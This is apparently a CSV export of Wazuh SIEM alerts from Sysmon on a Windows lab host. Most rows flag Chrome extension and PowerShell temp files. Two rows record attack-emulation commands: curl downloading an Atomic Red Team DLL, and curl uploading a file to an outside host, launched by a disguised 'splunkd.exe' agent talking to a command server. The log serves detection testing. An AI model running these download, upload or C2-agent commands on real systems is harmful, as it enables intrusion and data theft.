ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\runtime.js
CreationUtcTime: 2024-11-30 06:56:00.255
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.270896600Z,54730,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,37,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.748",EventChannel,1732949760.1056365,"Nov 30, 2024 @ 06:56:00.748", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.255, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\runtime.js,2024-11-30 06:56:00.255, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,I_rae5MBRlc-D5DF5R6u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:56:00.271
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_2005692577\CRX_INSTALL\script.js
CreationUtcTime: 2024-11-30 06:56:00.271
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:56:00.272459100Z,54731,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,36,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:56:00.748",EventChannel,1732949760.1059414,"Nov 30, 2024 @ 06:56:00.748", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:56:00.271, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_2005692577\\CRX_INSTALL\\script.js,2024-11-30 06:56:00.271, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Fvrae5MBRlc-D5DFqx4U,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:55:41.349
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_472693983\CRX_INSTALL\background.bundle.js
CreationUtcTime: 2024-11-30 06:55:41.349
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:55:41.363016900Z,54701,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,24,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:55:42.295",EventChannel,1732949742.1019371,"Nov 30, 2024 @ 06:55:42.295", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:55:41.349, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_472693983\\CRX_INSTALL\\background.bundle.js,2024-11-30 06:55:41.349, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Gfrae5MBRlc-D5DFqx4U,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:55:41.786
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1999297511\CRX_INSTALL\service_worker_bin_prod.js
CreationUtcTime: 2024-11-30 06:55:41.786
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:55:41.787301000Z,54712,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,27,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:55:42.467",EventChannel,1732949742.1028610,"Nov 30, 2024 @ 06:55:42.467", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:55:41.786, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1999297511\\CRX_INSTALL\\service_worker_bin_prod.js,2024-11-30 06:55:41.786, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,Gvrae5MBRlc-D5DFqx4U,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-11-30 06:55:41.786
ProcessGuid: {15959494-B6D5-674A-DB05-000000000D00}
ProcessId: 3204
Image: C:\Program Files\Google\Chrome\Application\chrome.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\scoped_dir3204_1999297511\CRX_INSTALL\offscreendocument_main.js
CreationUtcTime: 2024-11-30 06:55:41.786
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:55:41.788453200Z,54713,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,28,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:55:42.483",EventChannel,1732949742.1031723,"Nov 30, 2024 @ 06:55:42.483", , , , , , , , , , , , ,3204, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe, , , , , , ,{15959494-B6D5-674A-DB05-000000000D00},2024-11-30 06:55:41.786, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\scoped_dir3204_1999297511\\CRX_INSTALL\\offscreendocument_main.js,2024-11-30 06:55:41.786, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,D_rZe5MBRlc-D5DFmR6h,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:54:29.516
ProcessGuid: {15959494-B6A5-674A-D705-000000000D00}
ProcessId: 5056
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_o5e4z15o.b2y.ps1
CreationUtcTime: 2024-11-30 06:54:29.516
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:54:29.526317600Z,54553,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,23,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:54:30.654",EventChannel,1732949670.1000101,"Nov 30, 2024 @ 06:54:30.654", , , , , , , , , , , , ,5056, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B6A5-674A-D705-000000000D00},2024-11-30 06:54:29.516, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_o5e4z15o.b2y.ps1,2024-11-30 06:54:29.516, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,EPrZe5MBRlc-D5DFmR6h,1,1,192.168.117.134,window-agent3,003,Maryam, ,7009,Service Control Manager,0x8080000000000000,{555908d1-a6d7-4695-8e1e-26931d2012f4},2,System,0,"""A timeout was reached (30000 milliseconds) while waiting for the Fax service to connect.""",0,2024-11-30T06:54:29.773316600Z,2056,6552,DESKTOP-QGB4EQH,0,592,ERROR,Service Control Manager,3,false,5,Windows System error event,"[""windows"",""windows_system"",""system_error""]",61102,"[""IV_35.7.d""]","[""4.3""]",windows_eventchannel,log,"Nov 30, 2024 @ 06:54:30.843",EventChannel,1732949670.1003112,"Nov 30, 2024 @ 06:54:30.843", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,4600610078000000,30000,Fax, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,A_rWe5MBRlc-D5DFxh7u,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 06:51:26.851
ProcessGuid: {15959494-B5EE-674A-CB05-000000000D00}
ProcessId: 4620
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_uscangso.mi4.ps1
CreationUtcTime: 2024-11-30 06:51:26.851
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T06:51:26.860796500Z,54489,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,21,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:51:27.985",EventChannel,1732949487.939168,"Nov 30, 2024 @ 06:51:27.985", , , , , , , , , , , , ,4620, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-B5EE-674A-CB05-000000000D00},2024-11-30 06:51:26.851, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uscangso.mi4.ps1,2024-11-30 06:51:26.851, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,DPrYe5MBRlc-D5DFrx48,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T06:53:31.284184900Z,2055,5220,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,2,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:53:32.341",EventChannel,1732949612.984626,"Nov 30, 2024 @ 06:53:32.341", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,bPr0e5MBRlc-D5DFkB5a,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1105,technique_name=Ingress Tool Transfer
UtcTime: 2024-11-30 07:24:01.051
ProcessGuid: {15959494-BD91-674A-5A06-000000000D00}
ProcessId: 4864
Image: C:\Windows\System32\curl.exe
FileVersion: 7.55.1
Description: The curl executable
Product: The curl executable
Company: curl, https://curl.haxx.se/
OriginalFileName: curl.exe
CommandLine: C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB
ParentProcessGuid: {15959494-BD91-674A-5906-000000000D00}
ParentProcessId: 8152
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:24:01.055431100Z,55203,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,true,12,curl.exe launched with commands to create a binary file,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92074, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:24:02.128",EventChannel,1732951442.1337783,"Nov 30, 2024 @ 07:24:02.128", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4864, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , ,curl.exe,C:\\Windows\\System32\\curl.exe,The curl executable, , ,The curl executable, , ,{15959494-BD91-674A-5A06-000000000D00},2024-11-30 07:24:01.051,"SHA1=384CCB2CF4B457DA554EE9100BE26FC332155C56,MD5=BDEBD2FC4927DA00EEA263AF9CF8F7ED,SHA256=04AA05D63E3639F90995AFC0E635DAD45E57AFC858A88AC10EDE7C984043C781,IMPHASH=3D26825CC13D552363781DDA178B1ECB","technique_id=T1105,technique_name=Ingress Tool Transfer","curl, https://curl.haxx.se/",7.55.1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-BD91-674A-5906-000000000D00},cmd.exe /C C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll &amp;&amp; C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\\users\\public\\music\\allthethingsx64.dll &amp;&amp; C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\programdata\\allthethingsx64.dll &amp;&amp; C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\\allthethingsx64.dll,0x107a6b,8152,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,b_r1e5MBRlc-D5DFjh5R,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 07:25:07.049
ProcessGuid: {15959494-BDD3-674A-5B06-000000000D00}
ProcessId: 4468
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com && C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com && C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com && C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T07:25:07.051676900Z,55208,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,24,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 07:25:08.128",EventChannel,1732951508.1347680,"Nov 30, 2024 @ 07:25:08.128", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4468, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-BDD3-674A-5B06-000000000D00},2024-11-30 07:25:07.049,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C C:\\Windows\\System32\\Curl.exe -T c:\\temp\\atomictestfile.txt www.example.com &amp;&amp; C:\\Windows\\System32\\Curl.exe --upload-file c:\\temp\\atomictestfile.txt www.example.com &amp;&amp; C:\\Windows\\System32\\Curl.exe -d c:\\temp\\atomictestfile.txt www.example.com &amp;&amp; C:\\Windows\\System32\\Curl.exe --data c:\\temp\\atomictestfile.txt www.example.com,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
